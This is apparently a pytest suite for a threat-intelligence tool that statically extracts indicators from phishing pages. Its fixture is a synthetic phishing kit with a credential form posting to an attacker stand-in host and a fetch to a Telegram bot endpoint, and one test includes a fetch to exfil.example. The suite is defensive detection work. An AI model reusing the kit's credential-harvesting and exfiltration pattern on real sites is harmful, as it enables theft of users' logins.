"""Static forensic extraction (Task 8).

The page content in these tests is a synthetic phishing kit. The credentials in
it are obviously fake and are only there to prove they never come back out.
"""

from __future__ import annotations

from datetime import UTC, datetime
from typing import Any

import pytest

from ti_recon.enums import EvidenceClass, EvidenceEffect, MatchScope
from ti_recon.providers.urlscan.forensics import (
    MAX_ITEMS_PER_CATEGORY,
    MAX_SCAN_BYTES,
    SECRET_BEARING_IDENTIFIERS,
    ForensicProfile,
    analyze_dom,
    analyze_script,
    forensic_evidence,
    select_response_bodies,
)
from ti_recon.providers.urlscan.normalizer import NormalizationContext, ScanDocument

NOW = datetime(2026, 8, 22, 12, 0, tzinfo=UTC)

# Obviously synthetic: a token nobody could mistake for a live one.
FAKE_TELEGRAM_TOKEN = "123456789:AAFAKEfakeFAKEfakeFAKEfakeFAKEfake01"
FAKE_JWT = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJGQUtFIn0.ZmFrZS1zaWduYXR1cmU"

KIT = f"""
<html>
  <head>
    <title>Sign in to your account</title>
    <meta http-equiv="refresh" content="3; url=https://collector.evil.example/next">
    <script src="https://cdn.evil.example/kit.js"></script>
    <script src="/local/app.js"></script>
  </head>
  <body>
    <form action="https://collector.evil.example/collect.php" method="post">
      <input type="text" name="email">
      <input type="password" name="passwd">
      <input type="hidden" name="campaign_id">
    </form>
    <form action="/relative/also.php"></form>
    <iframe src="https://tracker.example/pixel"></iframe>
    <script>
      var bot = "{FAKE_TELEGRAM_TOKEN}";
      fetch("https://api.telegram.org/bot{FAKE_TELEGRAM_TOKEN}/sendMessage");
      var jwt = "{FAKE_JWT}";
    </script>
  </body>
</html>
""".encode()

PAGE_URL = "https://login.evil.example/office/index.html"


def context() -> NormalizationContext:
    return NormalizationContext(
        investigation_id="inv-1",
        subject_object_id="obj-1",
        now=NOW,
        match_scope=MatchScope.EXACT_OBSERVABLE,
    )


# --------------------------------------------------------------------------- #
# Nothing is ever executed
# --------------------------------------------------------------------------- #


def test_extraction_is_pure_string_matching() -> None:
    """The module must contain no way to run what it reads.

    Checked structurally rather than by grepping for words: ``re.compile`` is a
    legitimate compile call, and a text search cannot tell the two apart.
    """
    import ast
    import inspect
    from pathlib import Path

    from ti_recon.providers.urlscan import forensics

    tree = ast.parse(Path(inspect.getfile(forensics)).read_text(encoding="utf-8"))

    called = {
        node.func.id
        for node in ast.walk(tree)
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
    }
    assert not called & {"eval", "exec", "compile", "__import__", "open"}

    imported = {
        alias.name.split(".")[0]
        for node in ast.walk(tree)
        if isinstance(node, ast.Import)
        for alias in node.names
    } | {
        node.module.split(".")[0]
        for node in ast.walk(tree)
        if isinstance(node, ast.ImportFrom) and node.module
    }
    assert not imported & {"subprocess", "importlib", "os", "socket", "httpx", "asyncio"}


def test_analysis_needs_no_network_and_no_clock() -> None:
    profile = analyze_dom(KIT, page_url=PAGE_URL)
    assert isinstance(profile, ForensicProfile)


# --------------------------------------------------------------------------- #
# Secrets are detected, never kept
# --------------------------------------------------------------------------- #


def test_a_kits_exfiltration_credential_is_counted_not_stored() -> None:
    profile = analyze_dom(KIT, page_url=PAGE_URL)
    assert "telegram.bot-token" in profile.sensitive_identifier_types
    assert "telegram.bot-endpoint" in profile.sensitive_identifier_types
    assert "json.jwt" in profile.sensitive_identifier_types
    dumped = repr(profile.model_dump(mode="json"))
    assert FAKE_TELEGRAM_TOKEN not in dumped
    assert FAKE_JWT not in dumped


def test_no_secret_reaches_the_evidence_it_produces() -> None:
    profile = analyze_dom(KIT, page_url=PAGE_URL)
    result = forensic_evidence(context(), profile)
    dumped = repr([item.model_dump(mode="json") for item in result.evidence])
    assert FAKE_TELEGRAM_TOKEN not in dumped
    assert FAKE_JWT not in dumped
    assert "AAFAKEfake" not in dumped


def test_no_secret_reaches_a_fingerprint() -> None:
    """A digest over content would carry the secret into a comparable value."""
    profile = analyze_dom(KIT, page_url=PAGE_URL)
    assert profile.fingerprints.dom_structure is not None
    structure_only = analyze_dom(
        KIT.replace(FAKE_TELEGRAM_TOKEN.encode(), b"other-token-entirely"),
        page_url=PAGE_URL,
    )
    # The structure digest is over element names, so changing an embedded
    # secret must not change it.
    assert structure_only.fingerprints.dom_structure == profile.fingerprints.dom_structure


@pytest.mark.parametrize("identifier_type", sorted(SECRET_BEARING_IDENTIFIERS))
def test_every_secret_bearing_type_is_recognized(identifier_type: str) -> None:
    samples = {
        "telegram.bot-token": FAKE_TELEGRAM_TOKEN,
        "telegram.bot-endpoint": f"api.telegram.org/bot{FAKE_TELEGRAM_TOKEN}",
        "discord.webhook": "discord.com/api/webhooks/123456789012/" + "F" * 40,
        "google.api": "AIza" + "F" * 35,
        "json.jwt": FAKE_JWT,
        "mailgun.api-key": "key-" + "f" * 32,
        "square.access-token": "sq0atp-" + "F" * 22,
        "authorization.api": "Authorization: Bearer FAKE.token.value12345",
    }
    content = f'<html><script>var x = "{samples[identifier_type]}";</script></html>'.encode()
    profile = analyze_dom(content)
    assert identifier_type in profile.sensitive_identifier_types
    assert samples[identifier_type] not in repr(profile.model_dump(mode="json"))


def test_a_clean_page_reports_no_indicators() -> None:
    profile = analyze_dom(b"<html><body><p>hello</p></body></html>")
    assert profile.sensitive_identifier_counts == {}


def test_repeated_occurrences_are_counted() -> None:
    content = (f"<script>{FAKE_JWT} {FAKE_JWT}</script>").encode()
    profile = analyze_dom(content)
    assert profile.sensitive_identifier_counts["json.jwt"] == 2


# --------------------------------------------------------------------------- #
# What the page contains
# --------------------------------------------------------------------------- #


def test_where_the_credentials_go_is_extracted() -> None:
    profile = analyze_dom(KIT, page_url=PAGE_URL)
    assert "https://collector.evil.example/collect.php" in profile.form_actions
    assert profile.cross_origin_form_actions == ("https://collector.evil.example/collect.php",)


def test_a_relative_form_target_is_not_cross_origin() -> None:
    profile = analyze_dom(KIT, page_url=PAGE_URL)
    assert "/relative/also.php" in profile.form_actions
    assert "/relative/also.php" not in profile.cross_origin_form_actions


def test_a_same_origin_form_target_is_not_cross_origin() -> None:
    content = b'<form action="https://login.evil.example/post"></form>'
    profile = analyze_dom(content, page_url=PAGE_URL)
    assert profile.cross_origin_form_actions == ()


def test_without_a_page_url_absolute_targets_are_all_reported() -> None:
    """Omitting them would hide exactly the interesting case."""
    profile = analyze_dom(KIT)
    assert "https://collector.evil.example/collect.php" in profile.cross_origin_form_actions


def test_a_masked_input_is_recorded_as_a_fact() -> None:
    profile = analyze_dom(KIT, page_url=PAGE_URL)
    assert profile.has_masked_input is True
    assert profile.input_names == ("email", "passwd", "campaign_id")


def test_scripts_iframes_and_redirects_are_extracted() -> None:
    profile = analyze_dom(KIT, page_url=PAGE_URL)
    assert "https://cdn.evil.example/kit.js" in profile.script_sources
    assert "/local/app.js" in profile.script_sources
    assert profile.iframe_sources == ("https://tracker.example/pixel",)
    assert profile.meta_refresh_targets == ("https://collector.evil.example/next",)


def test_the_title_is_kept_for_brand_comparison() -> None:
    assert analyze_dom(KIT).title == "Sign in to your account"


def test_referenced_hosts_are_collected_but_never_visited() -> None:
    profile = analyze_dom(KIT, page_url=PAGE_URL)
    assert "collector.evil.example" in profile.referenced_hosts
    assert "cdn.evil.example" in profile.referenced_hosts


def test_a_page_with_nothing_in_it_produces_an_empty_profile() -> None:
    profile = analyze_dom(b"")
    assert profile.is_empty is True
    assert profile.fingerprints.is_empty is True


def test_undecodable_bytes_do_not_stop_analysis() -> None:
    """A kit is not obliged to serve valid UTF-8, and that must not hide it."""
    content = b'\xff\xfe<form action="https://evil.example/x"></form>'
    profile = analyze_dom(content)
    assert profile.form_actions == ("https://evil.example/x",)


# --------------------------------------------------------------------------- #
# Bounds
# --------------------------------------------------------------------------- #


def test_extraction_lists_are_capped() -> None:
    forms = b"".join(
        f'<form action="https://host{index}.example/x"></form>'.encode() for index in range(100)
    )
    profile = analyze_dom(forms)
    assert len(profile.form_actions) == MAX_ITEMS_PER_CATEGORY
    assert len(profile.referenced_hosts) == MAX_ITEMS_PER_CATEGORY


def test_a_huge_artifact_is_scanned_only_up_to_the_horizon() -> None:
    content = b"<html>" + b"a" * MAX_SCAN_BYTES + b'<form action="https://late.example/x">'
    profile = analyze_dom(content)
    assert profile.scan_truncated is True
    assert profile.form_actions == ()


def test_truncation_is_reported_so_an_absence_is_not_read_as_a_finding() -> None:
    profile = analyze_dom(b"x" * (MAX_SCAN_BYTES + 1))
    result = forensic_evidence(context(), profile)
    assert any(item.attributes.get("scan_truncated") for item in result.evidence)


# --------------------------------------------------------------------------- #
# Fingerprints
# --------------------------------------------------------------------------- #


def test_the_same_kit_on_another_domain_fingerprints_the_same() -> None:
    """This is the whole point of the exercise."""
    first = analyze_dom(KIT, page_url=PAGE_URL)
    second_kit = KIT.replace(b"Sign in to your account", b"Sign in now")
    second = analyze_dom(second_kit, page_url="https://other.example/")
    assert first.fingerprints.dom_structure == second.fingerprints.dom_structure
    assert first.fingerprints.form_targets == second.fingerprints.form_targets


def test_a_rebuilt_page_fingerprints_differently() -> None:
    first = analyze_dom(KIT)
    rebuilt = analyze_dom(b"<html><body><div>nothing like it</div></body></html>")
    assert first.fingerprints.dom_structure != rebuilt.fingerprints.dom_structure


def test_form_targets_fingerprint_independently_of_their_order() -> None:
    one = analyze_dom(b'<form action="https://a.example/1"></form><form action="/b"></form>')
    other = analyze_dom(b'<form action="/b"></form><form action="https://a.example/1"></form>')
    assert one.fingerprints.form_targets == other.fingerprints.form_targets


def test_a_page_with_no_forms_has_no_form_fingerprint() -> None:
    profile = analyze_dom(b"<html><body><p>text</p></body></html>")
    assert profile.fingerprints.form_targets is None
    assert profile.fingerprints.script_set is None
    assert profile.fingerprints.dom_structure is not None


# --------------------------------------------------------------------------- #
# Response bodies
# --------------------------------------------------------------------------- #


def test_a_script_body_yields_its_infrastructure_and_its_indicators() -> None:
    body = f'fetch("https://exfil.example/collect", {{headers: {{t: "{FAKE_JWT}"}}}})'.encode()
    profile = analyze_script(body)
    assert profile.referenced_hosts == ("exfil.example",)
    assert "json.jwt" in profile.sensitive_identifier_types
    assert FAKE_JWT not in repr(profile.model_dump(mode="json"))


def test_a_script_body_is_not_fingerprinted() -> None:
    """Its own SHA-256 is a better identity than anything derived here."""
    profile = analyze_script(b"console.log(1)")
    assert profile.fingerprints.is_empty is True


def test_an_empty_body_yields_an_empty_profile() -> None:
    assert analyze_script(b"").is_empty is True


def document_with(*entries: dict[str, Any]) -> ScanDocument:
    return ScanDocument({"data": {"requests": list(entries)}})


def response_entry(digest: str, mime: str) -> dict[str, Any]:
    return {"response": {"response": {"hash": digest, "mimeType": mime}}}


def test_only_textual_bodies_are_selected() -> None:
    document = document_with(
        response_entry("a" * 64, "text/javascript"),
        response_entry("b" * 64, "image/png"),
        response_entry("c" * 64, "text/html; charset=utf-8"),
        response_entry("d" * 64, "font/woff2"),
    )
    assert select_response_bodies(document, 10) == ("a" * 64, "c" * 64)


def test_body_selection_respects_its_budget() -> None:
    document = document_with(
        *(response_entry(f"{index:064x}", "text/javascript") for index in range(20))
    )
    assert len(select_response_bodies(document, 3)) == 3
    assert select_response_bodies(document, 0) == ()


def test_duplicate_bodies_are_selected_once() -> None:
    document = document_with(
        response_entry("a" * 64, "text/javascript"),
        response_entry("a" * 64, "text/javascript"),
    )
    assert select_response_bodies(document, 10) == ("a" * 64,)


@pytest.mark.parametrize(
    "entry",
    [
        {"response": "wrong"},
        {"response": {"response": "wrong"}},
        {"response": {"response": {"mimeType": "text/html"}}},
        {"response": {"response": {"hash": "short", "mimeType": "text/html"}}},
        {"response": {"response": {"hash": "a" * 64, "mimeType": 42}}},
        {"nothing": True},
        42,
    ],
)
def test_a_malformed_response_entry_is_skipped(entry: Any) -> None:
    assert select_response_bodies(document_with(entry), 10) == ()


def test_a_document_without_requests_selects_nothing() -> None:
    assert select_response_bodies(ScanDocument({}), 5) == ()
    assert select_response_bodies(ScanDocument({"data": {"requests": "no"}}), 5) == ()


# --------------------------------------------------------------------------- #
# Evidence shape
# --------------------------------------------------------------------------- #


def test_extraction_produces_facts_with_no_direction() -> None:
    """Concluding "phishing" from these facts is the assessment layer's job."""
    result = forensic_evidence(context(), analyze_dom(KIT, page_url=PAGE_URL))
    assert result.evidence
    for item in result.evidence:
        assert item.effect is EvidenceEffect.CONTEXT_ONLY
        assert item.effect is not EvidenceEffect.SUPPORTS_MALICIOUS


def test_findings_and_fingerprints_are_separate_claims() -> None:
    result = forensic_evidence(context(), analyze_dom(KIT, page_url=PAGE_URL))
    claims = {item.claim_type for item in result.evidence}
    assert claims == {"urlscan_page_forensics", "urlscan_page_fingerprints"}
    findings = next(item for item in result.evidence if item.claim_type == "urlscan_page_forensics")
    assert findings.evidence_class is EvidenceClass.DIRECT_OBSERVATION


def test_a_response_body_gets_its_own_claim_type() -> None:
    result = forensic_evidence(
        context(),
        analyze_script(b'fetch("https://exfil.example/x")'),
        claim_type="urlscan_response_forensics",
    )
    assert [item.claim_type for item in result.evidence] == ["urlscan_response_forensics"]


def test_evidence_points_back_at_the_artifact_it_came_from() -> None:
    result = forensic_evidence(
        context(), analyze_dom(KIT, page_url=PAGE_URL), artifact_id="artifact-1"
    )
    for item in result.evidence:
        assert item.attributes["artifact_id"] == "artifact-1"


def test_an_empty_profile_produces_no_evidence() -> None:
    assert forensic_evidence(context(), ForensicProfile()).evidence == ()


def test_a_profile_with_only_fingerprints_still_records_them() -> None:
    profile = analyze_dom(b"<html><body></body></html>")
    result = forensic_evidence(context(), profile)
    assert [item.claim_type for item in result.evidence] == ["urlscan_page_fingerprints"]


def test_an_unparseable_url_is_not_a_host() -> None:
    """A malformed authority raises inside urlsplit; it must not raise here."""
    profile = analyze_dom(b'<form action="https://[bad"></form>', page_url=PAGE_URL)
    assert profile.cross_origin_form_actions == ()
    assert profile.referenced_hosts == ()
